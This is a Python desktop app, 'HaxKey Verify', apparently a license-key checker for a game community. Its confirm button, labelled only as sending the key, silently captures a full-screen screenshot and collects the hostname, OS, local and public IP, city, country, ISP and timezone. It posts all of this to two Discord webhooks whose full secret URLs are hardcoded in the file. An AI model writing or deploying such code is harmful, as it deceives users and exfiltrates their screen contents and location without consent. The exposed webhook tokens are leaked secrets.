import customtkinter as ctk
import hashlib
import uuid
import platform
import socket
import os
from PIL import ImageGrab
from PIL import ImageGrab, Image
import requests
from tkinter import messagebox
import io
from datetime import datetime

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")
#WEBHOOK KENH PLAYERCHECKING-1(KENH DANH CHO STAFF VA ADMIN)
DISCORD_WEBHOOK2 = "https://discord.com/api/webhooks/1513033586087956572/VjU7eYqJmC0LwLq1N7spq0tIHlTvHb0cP8nWAC9_6VyrCb_iiJU5T2vB94j65zatm0_n"
#WEB-HOOK KENH CUA PLAYER XEM DUOC
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1513030839024488468/aCsx4jLOV6eAajOY43MC8uvswd-YsuRGP5aba5geDiRli2lewOSirZrweeWnbdAtYK0y"


def get_machine_info():
    mac = uuid.getnode()
    hostname = socket.gethostname()
    system = platform.system()
    version = platform.version()
    drive = os.getenv("SystemDrive")
    raw_string = f"{mac}-{hostname}-{system}-{version}-{drive}"
    return raw_string

def generate_license():
    machine_info = get_machine_info()
    hashed = hashlib.sha256(machine_info.encode()).hexdigest()
    license_key = f"{hashed[:8]}-{hashed[8:16]}-{hashed[16:24]}"
    return license_key.upper()

def get_ip_info():
    try:
        #lấy ip local
        local_ip = socket.gethostbyname(socket.gethostname())
        
        #lấy ip pub
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        public_ip = response.json()['ip']
        
        #lấy ip chi tiết
        ip_info_response = requests.get(f'http://ip-api.com/json/{public_ip}', timeout=5)
        ip_data = ip_info_response.json()
        
        return {
            'local_ip': local_ip,
            'public_ip': public_ip,
            'country': ip_data.get('country', 'N/A'),
            'city': ip_data.get('city', 'N/A'),
            'isp': ip_data.get('isp', 'N/A'),
            'timezone': ip_data.get('timezone', 'N/A')
        }
    except:
        return {
            'local_ip': 'N/A',
            'public_ip': 'N/A',
            'country': 'N/A',
            'city': 'N/A',
            'isp': 'N/A',
            'timezone': 'N/A'
        }

def send_screenshot_to_discord():
    try:
        #cap mh
        screenshot = ImageGrab.grab()
        
        #chuyển ảnh sang bytes
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        
        #lấy tt
        license_key = generate_license()
        ip_info = get_ip_info()
        
        #tạo pl
        payload = {
            'payload_json': requests.compat.json.dumps({
                # 'content': entry.get(),  # ← nội dung từ ô nhập
                'embeds': [{
                    'title': '🔑 License Key Xác Nhận',
                    'color': 3447003,
                    'fields': [
                        {'name': 'PLAYER', 'value': f'`{entry.get()}`', 'inline': False},
                        {'name': '📋 License Key', 'value': f'`{license_key}`', 'inline': False},
                    ],
                    'timestamp': datetime.utcnow().isoformat(),
                    'footer': {'text': 'VHC ANTIFAKE System'},
                    'image': {'url': 'attachment://screenshot.png'}
                }]
            })
        }
        
        #gửi qua dis
        files = {
            'file': ('screenshot.png', img_byte_arr, 'image/png')
        }
        #web2
        response = requests.post(DISCORD_WEBHOOK, data=payload, files=files)

        payload = {
            'payload_json': requests.compat.json.dumps({
                # 'content': entry.get(),  # ← nội dung từ ô nhập
                'embeds': [{
                    'title': '🔑 License Key Xác Nhận',
                    'color': 3447003,
                    'fields': [
                        {'name': 'PLAYER', 'value': f'`{entry.get()}`', 'inline': False},
                        {'name': '📋 License Key', 'value': f'`{license_key}`', 'inline': False},
                        {'name': '💻 Hostname', 'value': f'`{socket.gethostname()}`', 'inline': True},
                        {'name': '🖥️ System', 'value': f'`{platform.system()} {platform.release()}`', 'inline': True},
                        {'name': '🌐 IP Local', 'value': f'`{ip_info["local_ip"]}`', 'inline': True},
                        {'name': '🌍 IP Public', 'value': f'`{ip_info["public_ip"]}`', 'inline': True},
                        {'name': '📍 Location', 'value': f'`{ip_info["city"]}, {ip_info["country"]}`', 'inline': True},
                        {'name': '🏢 ISP', 'value': f'`{ip_info["isp"]}`', 'inline': True},
                        {'name': '⏰ Timezone', 'value': f'`{ip_info["timezone"]}`', 'inline': True},
                    ],
                    'timestamp': datetime.utcnow().isoformat(),
                    'footer': {'text': 'VHC ANTIFAKE System'},
                    'image': {'url': 'attachment://screenshot.png'}
                }]
            })
        }
        
        #gửi qua dis
        img_byte_arr.seek(0)
        files = {
            'file': ('screenshot.png', img_byte_arr, 'image/png')
        }
        
        response = requests.post(DISCORD_WEBHOOK2, data=payload, files=files)
        
        if response.status_code in [200, 204]:
            messagebox.showinfo("Thành công", "Đã gửi key thành công!\n Vui lòng tắt app")
            app.clipboard_clear()
            app.clipboard_append(license_key)
        else:
            messagebox.showerror("Lỗi", f"Không thể gửi xác nhận. Status: {response.status_code}\n{response.text}")
            
    except Exception as e:
        messagebox.showerror("Lỗi", f"Đã xảy ra lỗi: {str(e)}")

def confirm_action():
    #hiện tb
    result = messagebox.askyesno(
        "Xác nhận Key",
        "Ấn Yes để bắt đầu gửi key\n\n"
    )
    
    if result:
        send_screenshot_to_discord()
    else:
        messagebox.showinfo("Đã hủy", "Bạn đã hủy quá trình gửi key.")

#dongho

#app = ctk.CTk()
#try:
    #app.iconbitmap("icon.ico")
#except:
    #pass
import sys
import os

app = ctk.CTk()

WIN_W, WIN_H = 800, 500  # ← đổi thành kích thước cửa sổ của bạn

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

try:
    app.iconbitmap(resource_path("icon.ico"))
except Exception as e:
    print(e)

#app.geometry("500x300")
app.title("HaxKey Verify")
app.attributes("-alpha", 0.92)
banner = ctk.CTkImage(
    light_image=Image.open(resource_path("banner.png")),
    dark_image=Image.open(resource_path("banner.png")),
    size=(230, 80)
)

banner_label = ctk.CTkLabel(
    app,
    image=banner,
    text=""
)
banner_label.pack(pady=(15, 0))
# Frame trung tâm
frame = ctk.CTkFrame(app, corner_radius=20)
frame.pack(padx=40, pady=(5, 40))
#watermark
#wt

#frame đồng hồ ở trên cùng
#ngaygio

title = ctk.CTkLabel(frame, text="SECURE KEY", font=("Segoe UI", 18, "bold"))
title.pack(pady=15)

row = ctk.CTkFrame(frame, fg_color="transparent")
row.pack(pady=10)

label = ctk.CTkLabel(row, text="Tên hiển thị", font=("Segoe UI", 14, "bold"))
label.pack(side="left", padx=(0, 6))

entry = ctk.CTkEntry(row, placeholder_text="vd: ADY taideo")
entry.pack(side="left")
# Lấy nội dung đã nhập
text = entry.get()

license_text = ctk.CTkLabel(frame, text=generate_license(), font=("Consolas", 50))
license_text.pack(pady=20)

copy_btn = ctk.CTkButton(frame, text="Xác nhận", command=send_screenshot_to_discord)
copy_btn.pack(pady=10)

info_label = ctk.CTkLabel(
    frame, 
    text="Nhấn xác nhận để gửi Key",
    font=("Segoe UI", 10),
    text_color="yellow"
)
info_label.pack(pady=5)

#cre
watermark_frame = ctk.CTkFrame(app, fg_color="transparent")
watermark_frame.pack(side="bottom", anchor="se", padx=10, pady=10)

discord_label = ctk.CTkLabel(
    watermark_frame,
    text="discord: tai_dev",
    font=("Segoe UI", 12),
    text_color="gray"
)
discord_label.pack()
#cre
def setup():
    sw = app.winfo_screenwidth()
    sh = app.winfo_screenheight()
    x = (sw - WIN_W) // 2
    y = (sh - WIN_H) // 2
    app.geometry(f"{WIN_W}x{WIN_H}+{x}+{y}")
    app.bind("<Configure>", lambda e: app.geometry(f"{WIN_W}x{WIN_H}+{x}+{y}"))

app.after(100, setup)

app.mainloop()
